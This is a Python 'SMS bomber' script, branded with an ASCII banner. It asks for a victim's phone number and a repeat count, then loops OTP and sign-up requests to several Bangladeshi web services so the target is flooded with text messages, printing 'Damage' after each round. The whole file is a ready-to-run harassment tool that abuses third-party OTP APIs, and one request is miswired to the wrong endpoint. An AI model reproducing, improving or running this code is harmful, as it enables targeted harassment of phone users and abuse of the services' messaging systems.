import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""   _ ______         __      __  __  
  (_)_  __/__   __ / /__  __\ \/ /  
 / / / / (_-<  / // / _ \/ _ \  /   
/_/ /_/ /___/  \___/\___/_//_/_/    """+end)

number  = str(input("[>] Heii Mr : JonY Sir. apNar aTTack NumBer DiN: "))


amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))


url1 = "https://api.meenaclick.com/api/front/sms/send/pin?cell_phone=88"+number+"&type=sign-up"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"
headers1["Content-Length"] = "0"

url2 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers2 = CaseInsensitiveDict()

headers2["Content-Length"]="48"

headers2["Content-Type"]="application/json"

data2 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""

url3 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url4 = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.23183502639972242&validationkey=466429644f202f6120572a682b495374"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json;charset=UTF-8"
headers4["x-deviceid"] = "web-d881a3b625c9fbbcaa2ae2ac2c8bb061"

data4 = """{
  \"data\": {
    \"user\": {
      \"generic\": {
        \"userid\": \"88"""+number+"""\",
        \"password\": \"niilahmed281\",
        \"l10n\": \"en\",
        \"acceptedtermsandconditions\": true
      }
    }
  }
}"""


url5 = "https://bd.mybi.ma/apigw/1.1/send-otp"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/json; charset=utf-8"

data5 = """{
\"customer_msisdn\":\""""+number+"""\",\"country_partner\":\"BANGLADESH_ROBI\",\"device_indentifier\":\"Device_Id\"
}"""



for i in range(amount):
	try:
		resp1 = requests.post(url1, headers=headers1)

		resp2 = requests.post(url2, headers=headers2, data=data2)
		resp3 = requests.get(url3)
		resp4 = requests.post(url4, headers=headers4,  data=data4)

		resp5 = requests.post(url4, headers=headers4,  data=data5)

		print(str (i+1)+" Damage \n")

	except:
		print ("Please Make Sure Your Internet Connection")